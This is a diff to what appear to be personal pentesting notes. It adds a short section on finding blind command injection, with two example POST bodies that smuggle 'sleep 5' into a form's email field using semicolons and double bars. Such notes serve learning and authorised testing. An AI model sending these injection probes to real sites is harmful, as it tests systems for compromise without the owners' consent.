@@ -29,3 +29,24 @@ Linux
   ```
 
 ---
+
+## Discovering Blind Comand Injection Vulnerability
+
+It's Blind because, there is no ouput of the command displayed. 
+
+The **sleep** function can be used to verify if it's working
+
+e.g. In a POST request paylaod
+
+```
+csrf=32059523058230&name=test^email=test%40test.com;sleep+5;&subject=test&message=adfsdf
+```
+
+also can replace semicolons with double bars (OR)
+
+```
+csrf=32059523058230&name=test^email=test%40test.com||sleep+5||&subject=test&message=adfsdf
+```
+
+---
+
